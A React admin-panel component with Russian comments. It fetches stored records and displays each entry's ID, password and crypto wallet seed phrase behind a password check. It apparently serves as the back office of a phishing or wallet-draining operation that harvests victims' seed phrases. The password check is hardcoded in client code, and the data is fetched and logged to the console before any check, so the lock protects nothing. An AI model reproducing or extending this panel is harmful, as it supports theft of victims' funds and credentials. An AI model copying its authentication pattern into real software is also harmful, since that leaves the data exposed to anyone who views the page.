// AdminPanel.jsx
import React, { useState, useEffect } from "react";
import axios from "axios";

const AdminPanel = () => {
  const [data, setData] = useState([]);
 // Состояния для пароля и статуса аутентификации
 const [inputPassword, setInputPassword] = useState("");
 const [isAuthenticated, setIsAuthenticated] = useState(false);
 
 
 // Пароль для доступа к странице
 const correctPassword = "n%H,6r+CGYjAPt,tKd)0v!1^";

 // Обработчик отправки формы
 const handlePasswordSubmit = (e) => {
   e.preventDefault();
   // Проверка на корректность введенного пароля
   if (inputPassword === correctPassword) {
     setIsAuthenticated(true); // Устанавливаем, что пользователь аутентифицирован
   } else {
     alert("Неверный пароль. Попробуйте снова.");
     setInputPassword(""); // Очищаем поле ввода
   }
 };
  useEffect(() => {
    // Функция для получения данных с сервера
    const fetchData = async () => {
      try {
        const response = await axios.get("/api/data"); // Запрос к API

        console.log("Ответ от API:", response.data); // Проверяем структуру данных в консоли

        // Проверка, если response.data — массив, иначе пытаемся извлечь данные из свойств, как `rows`
        if (Array.isArray(response.data)) {
          setData(response.data);
        } else if (response.data.rows && Array.isArray(response.data.rows)) {
          setData(response.data.rows); // Используем `rows`, если данные обёрнуты
        } else {
          console.error("Ожидаемый ответ от API — массив.");
          setData([]); // Очищаем данные, если ответ не соответствует
        }
      } catch (error) {
        console.error("Ошибка при загрузке данных:", error);
      }
    };

    fetchData(); // Вызов функции получения данных при монтировании компонента
  }, []);

  return (
    <div className="p-6">
    {/* Проверяем, аутентифицирован ли пользователь */}
    {!isAuthenticated ? (
      <form onSubmit={handlePasswordSubmit} className="max-w-xs mx-auto p-4 border rounded shadow-md">
        <h2 className="text-xl font-bold mb-4 text-center">Введите пароль</h2>
        <input
          type="password"
          value={inputPassword}
          onChange={(e) => setInputPassword(e.target.value)}
          placeholder="Введите пароль"
          className="w-full px-3 py-2 border rounded mb-4"
          required
        />
        <button
          type="submit"
          className="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600 transition duration-200"
        >
          Войти
        </button>
      </form>
    ) : (
    <div className="p-6">
      <h2 className="text-2xl font-bold mb-4 text-center">Admin Panel</h2>
      <div className="overflow-x-auto">
        <table className="min-w-full bg-white border border-gray-300">
          <thead>
            <tr className="bg-gray-200">
              <th className="px-4 py-2 border-b border-gray-300 text-left text-gray-700">ID</th>
              <th className="px-4 py-2 border-b border-gray-300 text-left text-gray-700">Password</th>
              <th className="px-4 py-2 border-b border-gray-300 text-left text-gray-700">Seed Phrase</th>
            </tr>
          </thead>
          <tbody>
            {data.map((item, index) => (
              <tr key={item.id} className={index % 2 === 0 ? "bg-gray-50" : "bg-white"}>
                <td className="px-4 py-2 border-b border-gray-300 text-gray-800">{item.id}</td>
                <td className="px-4 py-2 border-b border-gray-300 text-gray-800">{item.password}</td>
                <td className="px-4 py-2 border-b border-gray-300 text-gray-800">{item.seed_phrase}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
    )}
    </div>
  );
};

export default AdminPanel;
